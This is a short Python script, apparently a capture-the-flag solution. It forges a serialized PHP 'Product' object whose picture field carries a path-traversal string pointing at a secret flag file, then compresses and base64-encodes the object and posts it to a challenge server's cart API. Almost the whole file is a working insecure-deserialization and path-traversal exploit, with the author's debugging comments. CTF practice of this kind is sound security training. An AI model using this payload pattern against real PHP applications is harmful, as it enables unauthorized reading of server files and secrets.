import base64
import zlib
import IPython
import requests

#We need to fabricate a cookie ?
o = b"""O:7:"Product":5:{s:11:"\x00Product\x00id";
i:0;s:13:"\x00Product\x00name";s:6:"asdasd";
s:20:"\x00Product\x00description";s:6:"asdasd";
s:16:"\x00Product\x00picture";
s:27:"../../../../secret/flag.txt";
s:14:"\x00Product\x00price";i:0;}"""
obj = base64.b64encode(zlib.compress(o))
print(obj)
r = requests.post("http://jinblack.it:3006/api/cart.php",  data= {'state': obj})
## with a "get" I get a 400, here I get a 500
##on embed type r.text to get it
IPython.embed()
